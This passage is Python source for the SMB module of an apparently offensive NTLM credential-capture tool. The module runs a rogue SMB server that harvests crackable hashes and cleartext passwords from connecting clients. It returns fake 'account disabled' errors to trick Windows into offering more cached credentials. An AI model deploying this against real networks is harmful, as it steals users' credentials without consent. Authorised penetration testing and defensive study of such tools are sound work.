# Copyright (c) 2025-Present MatrixEditor
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# pyright: basic
import uuid
import secrets
import typing

from typing_extensions import override

from scapy.fields import NetBIOSNameField
from impacket import (
    nmb,
    ntlm,
    smb,
    nt_errors,
    smb3,
    smb3structs as smb2,
    spnego,
    smbserver,
)
from caterpillar.py import (
    LittleEndian,
    f,
    struct,
    struct_factory,
    this,
    uint16,
)
from caterpillar.types import uint16_t

from dementor.config.toml import TomlConfig, Attribute as A
from dementor.config.session import SessionConfig
from dementor.config.util import is_true
from dementor.loader import BaseProtocolModule, DEFAULT_ATTR
from dementor.log.logger import ProtocolLogger, dm_logger
from dementor.protocols.ntlm import (
    NTLM_build_challenge_message,
    NTLM_TRANSPORT_CLEARTEXT,
    NTLM_TRANSPORT_RAW,
    NTLM_handle_negotiate_message,
    NTLM_timestamp,
    NTLM_handle_authenticate_message,
    NTLM_handle_legacy_raw_auth,
)
from dementor.protocols.spnego import (
    NEG_STATE_ACCEPT_COMPLETED,
    NEG_STATE_ACCEPT_INCOMPLETE,
    NEG_STATE_REJECT,
    SPNEGO_NTLMSSP_MECH,
    build_neg_token_init,
    build_neg_token_resp,
)
from dementor.servers import (
    BaseProtoHandler,
    ThreadingTCPServer,
    ServerThread,
    BaseServerThread,
)

__proto__ = ["SMB"]

# --- Helpers -----------------------------------------------------------------


def _split_smb_strings(data: bytes, is_unicode: bool) -> list[str]:
    r"""Split concatenated null-terminated SMB strings from raw bytes.

    Encoding is determined by FLAGS2_UNICODE (passed as *is_unicode*):

    * **ASCII** (``is_unicode=False``): each string is terminated by a
      single ``\x00``.  Decoded as ASCII with replacement.
      Per [MS-CIFS] §2.2.1.1 (OEM_STRING).
    * **UTF-16LE** (``is_unicode=True``): each string is terminated by
      ``\x00\x00`` at a 2-byte aligned offset from the segment start.
      Simple ``split(b"\x00\x00")`` is wrong because ``\x00`` can appear
      within a valid UTF-16LE code unit at an odd offset.
      Per [MS-CIFS] §2.2.1.1 (UNICODE_STRING).

    :param data: Raw concatenated null-terminated strings
    :param is_unicode: True when FLAGS2_UNICODE is set
    :return: List of decoded strings
    """
    if not data:
        return []

    if not is_unicode:
        # [MS-CIFS] §2.2.1.1: OEM_STRING — single \x00 terminator
        return [s.decode("ascii", errors="replace") for s in data.split(b"\x00") if s]

    # [MS-CIFS] §2.2.1.1: UNICODE_STRING — \x00\x00 at 2-byte aligned offsets
    segments: list[str] = []
    start = 0
    i = 0
    while i < len(data) - 1:
        if data[i] == 0 and data[i + 1] == 0 and (i - start) % 2 == 0:
            if i > start:
                segments.append(data[start:i].decode("utf-16-le", errors="replace"))
            start = i + 2
            i = start
        else:
            i += 1
    # Trailing segment without null terminator
    if start < len(data) and len(data) - start >= 2:
        trailing = data[start:].rstrip(b"\x00")
        if trailing:
            segments.append(trailing.decode("utf-16-le", errors="replace"))
    return segments


# --- Constants ---------------------------------------------------------------
SMB2_DIALECTS = {
    smb2.SMB2_DIALECT_002: "SMB 2.002",
    smb2.SMB2_DIALECT_21: "SMB 2.1",
    smb2.SMB2_DIALECT_WILDCARD: "SMB 2.???",
    smb2.SMB2_DIALECT_30: "SMB 3.0",
    smb2.SMB2_DIALECT_302: "SMB 3.0.2",
    smb2.SMB2_DIALECT_311: "SMB 3.1.1",
}

SMB2_NEGOTIABLE_DIALECTS = set(SMB2_DIALECTS) - {smb2.SMB2_DIALECT_WILDCARD}

SMB2_DIALECT_REV = {v: k for k, v in SMB2_DIALECTS.items()}

# [MS-SMB2] §2.2.3.1.1: SHA-512 hash algorithm ID = 0x0001
SMB2_INTEGRITY_SHA512 = uint16.to_bytes(0x0001, order=LittleEndian)

# String-to-hex mapping for SMB2 dialect config values
SMB2_DIALECT_STRINGS: dict[str, int] = {
    "2.002": smb2.SMB2_DIALECT_002,
    "2.1": smb2.SMB2_DIALECT_21,
    "3.0": smb2.SMB2_DIALECT_30,
    "3.0.2": smb2.SMB2_DIALECT_302,
    "3.1.1": smb2.SMB2_DIALECT_311,
}

# Realistic SMB2 server values per [MS-SMB2] §2.2.4 (Windows Server defaults)
# Per-dialect max sizes matching real Windows pcap behaviour:
#   2.0.2: 65536 (64K) — matches Vista/Srv2008
#   2.1:   1048576 (1M) or 8388608 (8M) — varies; use 8M for Server 2012+
#   3.0+:  8388608 (8M) — matches Windows Server 2012+
SMB2_MAX_SIZE_SMALL: int = 65_536  # SMB 2.0.2
SMB2_MAX_SIZE_LARGE: int = 8_388_608  # SMB 2.1+

# Realistic SMB2 capabilities — [MS-SMB2] §2.2.4
# DFS(0x01) | Leasing(0x02) | LargeMTU(0x04) | MultiChannel(0x08)
# | DirectoryLeasing(0x20) = 0x2f
# We do NOT set Encryption(0x40) since we don't implement it.
SMB2_SERVER_CAPABILITIES: int = 0x2F

# Realistic SMB1 negotiate capabilities per [MS-CIFS] §2.2.4.52.2
# Matching real Windows 7+ pcap (0x8001e3fc without CAP_EXTENDED_SECURITY):
#   UNICODE(0x04) | LARGE_FILES(0x08) | NT_SMBS(0x10) | RPC_REMOTE_APIS(0x20) |
#   STATUS32(0x40) | LEVEL_II_OPLOCKS(0x80) | LOCK_AND_READ(0x100) |
#   NT_FIND(0x200) | INFOLEVEL_PASSTHRU(0x2000) | LARGE_READX(0x4000) |
#   LARGE_WRITEX(0x8000) | LWIO(0x10000)
SMB1_CAPABILITIES_BASE: int = 0x0001E3FC

SMB1_MAX_MPX_COUNT: int = 50
SMB1_MAX_BUFFER_SIZE: int = 16644

# STATUS_ACCOUNT_DISABLED — used for multi-credential SSPI retry
STATUS_ACCOUNT_DISABLED: int = 0xC0000072

# [MS-SMB2] §2.2.3.1.7: SMB2_SIGNING_CAPABILITIES negotiate context type
SMB2_SIGNING_CAPABILITIES_ID: int = 0x0008


# (missing in impacket struct definitions)
# [MS-SMB2] §2.2.3.1.7 SMB2_SIGNING_CAPABILITIES
@struct(order=LittleEndian)
class SMB2SigningCapabilities(struct_factory.mixin):  # type: ignore[unsupported-base]
    SigningAlgorithmCount: uint16_t
    SigningAlgorithms: f[list[int], uint16[this.SigningAlgorithmCount]]


# --- Config ------------------------------------------------------------------
def parse_dialect(value: str | int) -> int:
    """Convert a dialect string (e.g. "3.1.1") to its hex constant.

    :param value: Dialect version as a string (e.g. "3.1.1") or integer hex constant
    :type value: str | int
    :raises ValueError: If the string is not a recognized SMB2 dialect
    :return: The SMB2 dialect hex constant
    :rtype: int
    """
    if isinstance(value, int):
        return value
    key = str(value).strip()
    if key not in SMB2_DIALECT_STRINGS:
        raise ValueError(
            f"Unknown SMB2 dialect {key!r}; valid: {', '.join(SMB2_DIALECT_STRINGS)}"
        )
    return SMB2_DIALECT_STRINGS[key]


class SMBServerConfig(TomlConfig):
    """Per-listener SMB server configuration loaded from TOML.

    Each ``[[SMB.Server]]`` entry in ``Dementor.toml`` produces one instance.
    NTLM settings are read from ``SessionConfig`` (populated by the
    ``[NTLM]`` section's ``apply_config()``), not from this config.
    """

    _section_ = "SMB"
    _fields_ = [
        # --- Transport & Protocol ---
        A("smb_port", "Port"),
        A("smb_enable_smb1", "EnableSMB1", True, factory=is_true),
        A("smb_enable_smb2", "EnableSMB2", True, factory=is_true),
        A("smb_allow_smb1_upgrade", "AllowSMB1Upgrade", True, factory=is_true),
        A("smb2_min_dialect", "SMB2MinDialect", "2.002", factory=parse_dialect),
        A("smb2_max_dialect", "SMB2MaxDialect", "3.1.1", factory=parse_dialect),
        # --- SMB Identity ---
        A("smb_nb_computer", "NetBIOSComputer", "DEMENTOR"),
        A("smb_nb_domain", "NetBIOSDomain", "WORKGROUP"),
        A("smb_server_os", "ServerOS", "Windows"),
        A("smb_native_lanman", "NativeLanMan", "Windows"),
        # --- Post-Auth ---
        A("smb_captures_per_connection", "CapturesPerConnection", 0, factory=int),
        A("smb_error_code", "ErrorCode", nt_errors.STATUS_SMB_BAD_UID),
    ]

    if typing.TYPE_CHECKING:
        smb_port: int
        smb_enable_smb1: bool
        smb_enable_smb2: bool
        smb_allow_smb1_upgrade: bool
        smb2_min_dialect: int
        smb2_max_dialect: int
        smb_nb_computer: str
        smb_nb_domain: str
        smb_server_os: str
        smb_native_lanman: str
        smb_captures_per_connection: int
        smb_error_code: int

    def set_smb_error_code(self, value: str | int) -> None:
        """Set the SMB error code from an integer or nt_errors attribute name.

        Falls back to STATUS_SMB_BAD_UID if the string does not match any
        known nt_errors constant.

        :param value: NTSTATUS code as an integer or attribute name string
            (e.g. "STATUS_ACCESS_DENIED")
        :type value: str | int
        """
        if isinstance(value, int):
            self.smb_error_code = value
        else:
            try:
                self.smb_error_code = getattr(nt_errors, str(value))
            except AttributeError:
                dm_logger.error(
                    f"Invalid SMB error code: {value} - using default: STATUS_SMB_BAD_UID"
                )
                self.smb_error_code = nt_errors.STATUS_SMB_BAD_UID


class SMB(BaseProtocolModule[SMBServerConfig]):
    name: str = "SMB"
    config_ty = SMBServerConfig
    config_attr = DEFAULT_ATTR
    config_enabled_attr = DEFAULT_ATTR
    config_list = True

    @override
    def create_server_thread(
        self, session: SessionConfig, server_config: SMBServerConfig
    ) -> BaseServerThread[SMBServerConfig]:
        """Create a server thread bound to the configured SMB port.

        :param session: The active session configuration.
        :type session: SessionConfig
        :param server_config: SMB-specific server configuration from TOML.
        :type server_config: SMBServerConfig
        :return: A server thread running :class:`SMBServer`.
        :rtype: BaseServerThread[SMBServerConfig]
        """
        return ServerThread(
            session,
            server_config,
            SMBServer,
            include_server_config=True,
            server_address=(
                session.bind_address,
                server_config.smb_port,
            ),
        )


# --- Utilities ---------------------------------------------------------------
def get_server_time() -> int:
    """Return current UTC time as a Windows FILETIME for SMB timestamps.

    :return: Current UTC time encoded as a 64-bit Windows FILETIME value
    :rtype: int
    """
    return NTLM_timestamp()


def get_command_name(command: int, smb_version: int) -> str:
    """Map an SMB command opcode to its human-readable name.

    Searches the ``smb.SMB`` constants (for SMBv1) or ``smb2`` module
    constants (for SMBv2) to find the symbolic name matching the opcode.

    :param command: The SMB command opcode to look up
    :type command: int
    :param smb_version: SMB protocol version (``0x01`` for SMB1, ``0x02`` for SMB2)
    :type smb_version: int
    :return: The symbolic command name (e.g. "SMB_COM_NEGOTIATE"), or "Unknown"
    :rtype: str
    """
    match smb_version:
        case 0x01:
            for key, value in vars(smb.SMB).items():
                if key.startswith("SMB_COM") and value == command:
                    return key

        case 0x02:
            if 0 <= command < 0x13:
                for key, value in vars(smb2).items():
                    if key.startswith("SMB2_") and value == command:
                        return key
        case _:
            pass

    return "Unknown"


# --- Handler -----------------------------------------------------------------
class SMBHandler(BaseProtoHandler):
    """Per-connection SMB protocol handler for NTLM credential capture.

    Implements both SMB1 and SMB2/3 protocol paths as an auth-capture scaffold:
    negotiates the protocol, runs the NTLMSSP exchange to extract crackable
    hashes, optionally retries for multi-credential capture, then drops the
    connection. Supports extended security (SPNEGO/NTLMSSP), basic security
    (raw challenge/response), and cleartext password capture.

    Command dispatch is table-driven via :attr:`smb1_commands` and
    :attr:`smb2_commands` dicts populated in :meth:`__init__`.
    """

    STATE_NEGOTIATE = 0
    STATE_AUTH = 1

    # ══ Connection Lifecycle ════════════════════════════════════════════════════

    def __init__(
        self,
        config: SessionConfig,
        server_config: SMBServerConfig,
        request: typing.Any,
        client_address: tuple[str, int],
        server: typing.Any,
    ) -> None:
        """Initialize the SMB protocol handler for a single client connection.

        Sets up per-connection state including SMB1/SMB2 session tracking,
        authentication counters, and command dispatch tables. Delegates to
        :class:`BaseProtoHandler` for transport setup.

        :param config: The active session configuration
        :type config: SessionConfig
        :param server_config: SMB-specific server configuration from TOML
        :type server_config: SMBServerConfig
        :param request: The raw socket/request object from the TCP server
        :type request: typing.Any
        :param client_address: The ``(host, port)`` tuple of the connecting client
        :type client_address: tuple[str, int]
        :param server: The parent :class:`SMBServer` instance
        :type server: typing.Any
        """
        self.authenticated = False
        self.smb_config = server_config

        # Per-connection state
        self.smb1_extended_security: bool = True
        self.smb1_challenge: bytes = config.ntlm_challenge
        # Server-assigned user ID for this SMB1 session. Allocated on
        # first session setup; 0 means no session yet. Clients echo this
        # in subsequent requests to identify their session.
        # [MS-SMB] §3.3.5.3
        self.smb1_uid: int = 0
        # Server-assigned session ID for this SMB2 session. Allocated on
        # first session setup; 0 means no session yet. Must never be 0
        # or -1 in responses after allocation. [MS-SMB2] §3.3.5.5.1
        self.smb2_session_id: int = 0
        # Server-assigned tree IDs for this connection. Starts at 1;
        # incremented for each TREE_CONNECT. [MS-SMB2] §3.3.5.7
        self.smb2_tree_id_counter: int = 0
        # Selected SMB2 dialect for this connection, set during negotiate.
        # Used by FSCTL_VALIDATE_NEGOTIATE_INFO. [MS-SMB2] §3.3.5.15.12
        self.smb2_selected_dialect: int = 0
        # Client signing requirement from SMB2 NEGOTIATE SecurityMode
        # bit 0x0002.  Future-proofing for Win11 24H2+ / Server 2025.
        self.smb2_client_signing_required: bool = False
        # Highest dialect the client offered (uncapped).  Used with
        # signing_required to decide IS_GUEST strategy.
        self.smb2_client_max_dialect: int = 0
        # Tracks how many credential captures have occurred on this
        # connection. Used to implement multi-credential capture: after
        # each capture (except the last), the server returns
        # STATUS_ACCOUNT_DISABLED to trick Windows SSPI into retrying
        # with a different cached credential.
        self.auth_attempt_count: int = 0
        # Accumulated client info from all messages (NEGOTIATE, SESSION_SETUP,
        # AUTHENTICATE). Emitted as a single display line after auth completes.
        self.client_info: dict[str, str] = {}
        # Filenames from CREATE/NT_CREATE_ANDX, deduped across the connection.
        self.client_files: set[str] = set()
        # NTLM NEGOTIATE fields returned by NTLM_handle_negotiate_message().
        # Passed back to NTLM_handle_authenticate_message() so the display line is the
        # deduped union of Type 1 + Type 3.  This is ntlm.py's own output
        # passed through — smb.py never reads or modifies it.
        self.ntlm_negotiate_fields: dict[str, str] = {}
        # Sequential file ID counters for fake file handles.
        # SMB1 FIDs are 16-bit; SMB2 FileIDs are 64-bit volatile IDs.
        self.smb1_fid_counter: int = 0
        self.smb2_file_id_counter: int = 0

        self.smb1_commands: dict[int, typing.Any] = {
            smb.SMB.SMB_COM_NEGOTIATE: self.handle_smb1_negotiate,
            smb.SMB.SMB_COM_SESSION_SETUP_ANDX: self.handle_smb1_session_setup,
            smb.SMB.SMB_COM_TREE_CONNECT_ANDX: self.handle_smb1_tree_connect,
            smb.SMB.SMB_COM_LOGOFF_ANDX: self.handle_smb1_logoff,
            smb.SMB.SMB_COM_CLOSE: self.handle_smb1_close,
            smb.SMB.SMB_COM_READ_ANDX: self.handle_smb1_read,
            smb.SMB.SMB_COM_TRANSACTION2: self.handle_smb1_trans2,
            smb.SMB.SMB_COM_TREE_DISCONNECT: self.handle_smb1_tree_disconnect,
            smb.SMB.SMB_COM_NT_CREATE_ANDX: self.handle_smb1_nt_create,
        }
        self.smb2_commands: dict[int, typing.Any] = {
            smb2.SMB2_NEGOTIATE: self.handle_smb2_negotiate,
            smb2.SMB2_SESSION_SETUP: self.handle_smb2_session_setup,
            smb2.SMB2_LOGOFF: self.handle_smb2_logoff,
            smb2.SMB2_TREE_CONNECT: self.handle_smb2_tree_connect,
            smb2.SMB2_TREE_DISCONNECT: self.handle_smb2_tree_disconnect,
            smb2.SMB2_CREATE: self.handle_smb2_create,
            smb2.SMB2_CLOSE: self.handle_smb2_close,
            smb2.SMB2_READ: self.handle_smb2_read,
            smb2.SMB2_IOCTL: self.handle_smb2_ioctl,
            smb2.SMB2_WRITE: self.handle_smb2_write,
            smb2.SMB2_FLUSH: self.handle_smb2_flush,
            smb2.SMB2_LOCK: self.handle_smb2_lock,
            smb2.SMB2_QUERY_DIRECTORY: self.handle_smb2_query_directory,
            smb2.SMB2_QUERY_INFO: self.handle_smb2_query_info,
            smb2.SMB2_SET_INFO: self.handle_smb2_set_info,
        }
        super().__init__(config, request, client_address, server)

    def proto_logger(self) -> ProtocolLogger:
        """Create a protocol-specific logger with SMB metadata.

        :return: A logger instance tagged with protocol name, color, host, and port
        :rtype: ProtocolLogger
        """
        return ProtocolLogger(
            extra={
                "protocol": "SMB",
                "protocol_color": "light_goldenrod1",
                "host": self.client_host,
                "port": self.smb_config.smb_port,
            }
        )

    def setup(self) -> None:
        """Log the incoming client connection at debug level."""
        self.logger.debug(f"Incoming connection from {self.client_host}")

    def finish(self) -> None:
        """Emit accumulated SMB client info and log connection closure."""
        self._emit_smb_client_info()
        self.logger.debug(f"Connection to {self.client_host} closed")

    def _emit_smb_client_info(self) -> None:
        """Emit a single display line with accumulated SMB-layer client info.

        Called once per connection after all SMB fields have been collected.
        Includes: NativeOS, NativeLanMan, CallingName, CalledName,
        AccountName, PrimaryDomain, tree connect Path.
        """
        keys = [
            ("smb_os", "os"),
            ("smb_lanman", "lanman"),
            ("smb_calling_name", "calling"),
            ("smb_called_name", "called"),
            ("smb_account", "account"),
            ("smb_domain", "domain"),
            ("smb_path", "path"),
            ("smb_dialect", "dialect"),
        ]
        parts = [
            f"{label}:{self.client_info[k]}"
            for k, label in keys
            if self.client_info.get(k)
        ]
        if self.client_files:
            parts.append(f"files:{','.join(sorted(self.client_files))}")
        if parts:
            self.logger.info("SMB: %s", " | ".join(parts))

    # ══ Transport & Dispatch ════════════════════════════════════════════════════

    def send_data(self, payload: bytes, ty: int | None = None) -> None:
        """Wrap payload in a NetBIOS session packet and send it to the client.

        :param payload: The raw bytes to send as the NetBIOS trailer
        :type payload: bytes
        :param ty: NetBIOS session packet type, defaults to NETBIOS_SESSION_MESSAGE
        :type ty: int | None, optional
        """
        packet = nmb.NetBIOSSessionPacket()
        packet.set_type(ty or nmb.NETBIOS_SESSION_MESSAGE)
        packet.set_trailer(payload)
        self.send(packet.rawData())

    def send_smb1_command(
        self,
        command: int,
        data: object,
        parameters: object,
        packet: smb.NewSMBPacket,
        error_code: int | None = None,
    ) -> None:
        """Build and send an SMB1 response wrapped in a NetBIOS session packet.

        Constructs the full SMB1 response header with correct Flags1
        (reply bit), Flags2 (mode-aware: EXTENDED_SECURITY only set when
        the connection negotiated extended security), echoed PID/TID/MID,
        the server-assigned Uid, and the NTSTATUS error code split into
        the legacy ErrorClass/Reserved/ErrorCode fields.

        Spec: [MS-CIFS] §2.2.3.1 (SMB header), [MS-SMB] §2.2.3.1 (Flags2)

        :param command: The SMB1 command code (e.g. ``smb.SMB.SMB_COM_NEGOTIATE``)
        :type command: int
        :param data: The SMB command data portion (SMBCommand Data field)
        :type data: object
        :param parameters: The SMB command parameters portion (SMBCommand Parameters field)
        :type parameters: object
        :param packet: The original client request packet, used to echo PID/TID/MID
        :type packet: smb.NewSMBPacket
        :param error_code: NTSTATUS error code for the response, defaults to None (success)
        :type error_code: int | None, optional
        """
        resp = smb.NewSMBPacket()
        # [MS-CIFS] §2.2.3.1: SMB_FLAGS_REPLY (0x80) on server responses
        resp["Flags1"] = smb.SMB.FLAGS1_REPLY

        # Flags2 depends on security mode — [MS-SMB] §2.2.3.1
        flags2 = (
            smb.SMB.FLAGS2_NT_STATUS
            | smb.SMB.FLAGS2_LONG_NAMES
            | (packet["Flags2"] & smb.SMB.FLAGS2_UNICODE)
        )
        if self.smb1_extended_security:
            flags2 |= smb.SMB.FLAGS2_EXTENDED_SECURITY
        resp["Flags2"] = flags2

        resp["Pid"] = packet["Pid"]
        resp["Tid"] = packet["Tid"]
        resp["Mid"] = packet["Mid"]
        # Server-assigned session UID — [MS-SMB] §3.3.5.3
        if self.smb1_uid:
            resp["Uid"] = self.smb1_uid
        if error_code:
            resp["ErrorCode"] = error_code >> 16
            resp["_reserved"] = error_code >> 8 & 0xFF
            resp["ErrorClass"] = error_code & 0xFF

        cmd = smb.SMBCommand(command)
        cmd["Data"] = data
        cmd["Parameters"] = parameters
        resp.addCommand(cmd)

        self.send_data(resp.getData())

    def send_smb2_command(
        self,
        command_data: bytes,
        packet: typing.Any | None = None,
        command: int | None = None,
        status: int | None = None,
    ) -> None:
        """Build and send an SMB2 response wrapped in a NetBIOS session packet.

        Constructs the full SMB2 header with the server-to-client flag,
        NTSTATUS code, echoed command/credit/message fields, and the
        server-assigned SessionID. When no request packet is provided
        (e.g., for unsolicited NEGOTIATE responses), uses safe defaults.

        Spec: [MS-SMB2] §2.2.1 (SMB2 header), [MS-SMB2] §3.3.5.5.1 (SessionID)

        :param command_data: The serialized SMB2 command response body
        :type command_data: bytes
        :param packet: The original client request packet for echoing fields,
            defaults to None (uses safe defaults)
        :type packet: typing.Any | None, optional
        :param command: SMB2 command opcode override when *packet* is None,
            defaults to None
        :type command: int | None, optional
        :param status: NTSTATUS code for the response, defaults to None
            (STATUS_SUCCESS)
        :type status: int | None, optional
        """
        resp = smb2.SMB2Packet()
        # [MS-SMB2] §2.2.1: SMB2_FLAGS_SERVER_TO_REDIR (0x01) on responses
        resp["Flags"] = smb2.SMB2_FLAGS_SERVER_TO_REDIR
        # [MS-SMB2] §2.2.1: NTSTATUS code
        resp["Status"] = status or nt_errors.STATUS_SUCCESS

        if packet is None:
            packet = {
                "Command": command or 0,
                "CreditCharge": 0,
                "Reserved": 0,
                "MessageID": 0,
                # [MS-SMB2] §2.2.1: TreeId MUST be 0 for NEGOTIATE
                "TreeID": 0,
            }
        resp["Command"] = packet["Command"]
        resp["CreditCharge"] = packet["CreditCharge"]
        resp["Reserved"] = packet["Reserved"]
        # Server-assigned SessionID — [MS-SMB2] §3.3.5.5.1
        resp["SessionID"] = self.smb2_session_id
        resp["MessageID"] = packet["MessageID"]
        resp["TreeID"] = packet["TreeID"]
        # Real Windows grants 32-256 credits; 1 causes smbclient to exhaust
        # credits during compound requests (get, dir listing).
        resp["CreditRequestResponse"] = 32
        resp["Data"] = command_data
        self.send_data(resp.getData())

    def _smb2_error_response(self, packet: smb2.SMB2Packet, status: int) -> None:
        """Send a spec-compliant SMB2 error response.

        Per [MS-SMB2] §2.2.2, error responses use the SMB2 ERROR Response
        structure (StructureSize=0x09) with the appropriate NTSTATUS code.

        :param packet: The original request packet
        :type packet: smb2.SMB2Packet
        :param status: NTSTATUS error code
        :type status: int
        """
        resp = smb2.SMB2Error()
        self.send_smb2_command(resp.getData(), packet, status=status)

    def handle_data(self, data: bytes | None, transport: typing.Any) -> None:
        """Main connection loop: receive, decode, and dispatch SMB packets.

        Each TCP connection is wrapped in NetBIOS session framing (RFC 1002).
        This loop reads NetBIOS packets, handles session requests (port 139),
        discards keep-alives, then extracts the SMB payload. The first byte
        of the payload determines the SMB version:
          0xFF = SMB1 ([MS-SMB])
          0xFE = SMB2/3 ([MS-SMB2])
        and the packet is dispatched to the appropriate command handler via
        :meth:`handle_smb_packet`. EnableSMB1/EnableSMB2 config gates each path.

        :param data: Initial data from the connection (unused; data is read in the loop)
        :type data: bytes | None
        :param transport: The transport layer context (unused; kept for interface compatibility)
        :type transport: typing.Any
        """
        while True:
            data = self.recv(8192)
            if not data:
                break

            packet = nmb.NetBIOSSessionPacket(data)
            if packet.get_type() == nmb.NETBIOS_SESSION_KEEP_ALIVE:
                self.logger.debug("NETBIOS_SESSION_KEEP_ALIVE", is_client=True)
                continue

            if packet.get_type() == nmb.NETBIOS_SESSION_REQUEST:
                try:
                    _, remote, caller = packet.get_trailer().split(b" ")
                    field = NetBIOSNameField("caller", b"<invalid>")
                    called_name = field.m2i(None, b"\x20" + remote[:-2]).decode(
                        errors="replace"
                    )
                    calling_name = field.m2i(None, b"\x20" + caller[:-2]).decode(
                        errors="replace"
                    )
                    cn = calling_name.rstrip().rstrip("\x00")
                    cdn = called_name.rstrip().rstrip("\x00")
                    self.logger.debug(
                        f"NETBIOS_SESSION_REQUEST: "
                        f"CallingName={cn or '(empty)'} "
                        f"CalledName={cdn or '(empty)'}",
                        is_client=True,
                    )
                    if cn:
                        self.client_info["smb_calling_name"] = cn
                    if cdn:
                        self.client_info["smb_called_name"] = cdn
                except ValueError:
                    pass
                self.send_data(b"\x00", nmb.NETBIOS_SESSION_POSITIVE_RESPONSE)
                continue

            raw_smb_data = packet.get_trailer()
            if len(raw_smb_data) == 0:
                self.logger.debug("Received empty SMB packet")
                continue

            cfg = self.smb_config
            smbv1 = False
            match raw_smb_data[0]:
                case 0xFF:  # SMB1
                    if not cfg.smb_enable_smb1:
                        self.logger.debug("SMB1 disabled, dropping")
                        break
                    packet = smb.NewSMBPacket(data=raw_smb_data)
                    smbv1 = True
                case 0xFE:  # SMB2/SMB3
                    if not cfg.smb_enable_smb2:
                        self.logger.debug("SMB2 disabled, dropping")
                        break
                    packet = smb2.SMB2Packet(data=raw_smb_data)
                case _:
                    self.logger.debug(f"Unknown SMB packet type: {raw_smb_data[0]}")
                    break

            self.handle_smb_packet(packet, smbv1)

    def handle_smb_packet(self, packet: typing.Any, smbv1: bool = False) -> None:
        """Dispatch a parsed SMB packet to the registered command handler.

        Looks up the command opcode in the smb1_commands or smb2_commands
        dispatch table (populated in :meth:`__init__`) and calls the matching
        handler method. Unrecognized commands terminate the connection.

        :param packet: Parsed SMB packet (SMB1 or SMB2) from the client
        :type packet: typing.Any
        :param smbv1: Whether this is an SMB1 packet, defaults to False
        :type smbv1: bool, optional
        :raises BaseProtoHandler.TerminateConnection: If the command is not
            implemented or the handler raises it
        """
        command = packet["Command"]
        command_name = get_command_name(command, 1 if smbv1 else 2)
        title = f"SMBv{1 if smbv1 else 2} command {command_name} ({command:#04x})"
        handler_map = self.smb1_commands if smbv1 else self.smb2_commands
        handler = handler_map.get(command)
        if handler:
            try:
                handler(packet)
            except BaseProtoHandler.TerminateConnection:
                raise
            except (ConnectionResetError, BrokenPipeError):
                self.logger.debug(f"Connection lost during {title}")
                raise BaseProtoHandler.TerminateConnection from None
            except Exception:
                self.logger.exception(f"Error in {title}")
        elif not smbv1:
            # Unhandled SMB2 command — respond with STATUS_NOT_SUPPORTED
            # instead of dropping the connection.  This keeps the session
            # alive so the client can proceed to TREE_CONNECT with the
            # real share path after IPC$ queries (CREATE, IOCTL, CLOSE).
            # [MS-SMB2] §2.2.2: Error responses use SMB2 ERROR structure
            self.logger.debug(
                f"{title} (unhandled, returning NOT_SUPPORTED)", is_client=True
            )
            resp = smb2.SMB2Error()
            self.send_smb2_command(
                resp.getData(),
                packet,
                status=nt_errors.STATUS_NOT_SUPPORTED,
            )
        else:
            # Unhandled SMB1 command — respond with STATUS_NOT_IMPLEMENTED
            # instead of dropping the connection.  Keeps the session alive
            # so the client can proceed with file operations.
            # [MS-CIFS] §3.3.5: error response for unsupported commands
            self.logger.debug(
                f"{title} (unhandled, returning NOT_IMPLEMENTED)", is_client=True
            )
            self.send_smb1_command(
                command,
                b"",
                b"",
                packet,
                error_code=nt_errors.STATUS_NOT_IMPLEMENTED,
            )

    # ══ Phase 1: Negotiate ══════════════════════════════════════════════════════

    # -- SMB2 Negotiate --

    def _smb3_neg_context_pad(self, data_len: int) -> bytes:
        """Compute padding bytes for 8-byte alignment of negotiate contexts.

        [MS-SMB2] §2.2.4: padding between negotiate contexts for 8-byte
        alignment. Spec does not mandate a pad value; Windows uses 0x00.

        :param data_len: Current data length to pad from
        :type data_len: int
        :return: Zero-filled padding bytes (0 to 7 bytes)
        :rtype: bytes
        """
        return b"\x00" * ((8 - (data_len % 8)) % 8)

    def _smb3_build_neg_context_list(
        self,
        context_objects: list[tuple[int, bytes]],
    ) -> bytes:
        """Encode a list of SMB 3.1.1 negotiate contexts with padding.

        Each context is serialized as an :class:`SMB2NegotiateContext` structure
        followed by padding for 8-byte alignment per [MS-SMB2] §2.2.4.

        :param context_objects: List of ``(context_type, data_bytes)`` tuples
            where *context_type* is the negotiate context type ID and
            *data_bytes* is the serialized context payload
        :type context_objects: list[tuple[int, bytes]]
        :return: Concatenated and padded negotiate context list
        :rtype: bytes
        """
        context_list = b""
        for caps_type, caps in context_objects:
            context = smb3.SMB2NegotiateContext()
            context["ContextType"] = caps_type
            context["Data"] = caps
            context["DataLength"] = len(caps)

            context_list += context.getData()
            context_list += self._smb3_neg_context_pad(context["DataLength"])
        return context_list

    def _smb3_get_target_capabilities(
        self, request: smb2.SMB2Negotiate
    ) -> tuple[int, ...]:
        """Extract client's preferred encryption and signing from 3.1.1 contexts.

        Parses the SMB 3.1.1 negotiate context list from the client's
        NEGOTIATE request to determine the preferred encryption cipher
        and signing algorithm. Falls back to AES-128-GCM and AES-CMAC
        defaults if parsing fails.

        :param request: Parsed SMB2 NEGOTIATE request containing 3.1.1 contexts
        :type request: smb2.SMB2Negotiate
        :return: Tuple of ``(target_cipher, target_sign)`` algorithm IDs
        :rtype: tuple[int, ...]
        """
        target_cipher = smb3.SMB2_ENCRYPTION_AES128_GCM
        target_sign = 0x001  # [MS-SMB2] §2.2.3.1.7: AES-CMAC signing algorithm
        try:
            context_data = smb3.SMB311ContextData(request["ClientStartTime"])
            context_list_offset = context_data["NegotiateContextOffset"] - 64
            assert request.rawData is not None
            raw_context_list = request.rawData[context_list_offset:]
